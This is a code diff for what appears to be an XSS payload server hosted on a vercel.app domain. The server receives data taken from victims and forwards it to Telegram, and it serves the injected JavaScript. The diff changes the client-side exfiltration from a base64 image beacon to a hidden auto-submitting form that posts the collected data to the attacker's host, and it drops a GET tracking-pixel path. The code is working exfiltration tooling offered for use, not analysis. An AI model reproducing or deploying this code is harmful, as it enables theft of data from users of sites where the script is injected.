@@ -1,20 +1,16 @@
 export default async function handler(req, res) {
   if (req.method === 'POST') {
-    const data = req.body;
+    let data;
+    if (req.body.data) {
+      // Form submission
+      data = JSON.parse(req.body.data);
+    } else {
+      // Direct JSON
+      data = req.body;
+    }
+    
     await sendTelegram(data);
     return res.status(200).json({ status: 'received' });
-  }
-  
-  if (req.method === 'GET' && req.query && Object.keys(req.query).length > 0) {
-    const encodedData = Object.keys(req.query)[0];
-    try {
-      const data = JSON.parse(Buffer.from(encodedData, 'base64').toString());
-      await sendTelegram(data);
-    } catch(e) {}
-    
-    const pixel = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
-    res.setHeader('Content-Type', 'image/gif');
-    return res.send(pixel);
   }
   
   res.setHeader('Content-Type', 'application/javascript');
@@ -30,8 +26,18 @@ function safe(val) {
 }
 
 function sendData(payload) {
-  var img = new Image();
-  img.src = 'https://xss-teal.vercel.app/?' + btoa(JSON.stringify(payload));
+  var form = document.createElement('form');
+  form.method = 'POST';
+  form.action = 'https://xss-teal.vercel.app/';
+  form.style.display = 'none';
+  
+  var input = document.createElement('input');
+  input.name = 'data';
+  input.value = JSON.stringify(payload);
+  form.appendChild(input);
+  
+  document.body.appendChild(form);
+  form.submit();
 }
 
 function collectData() {
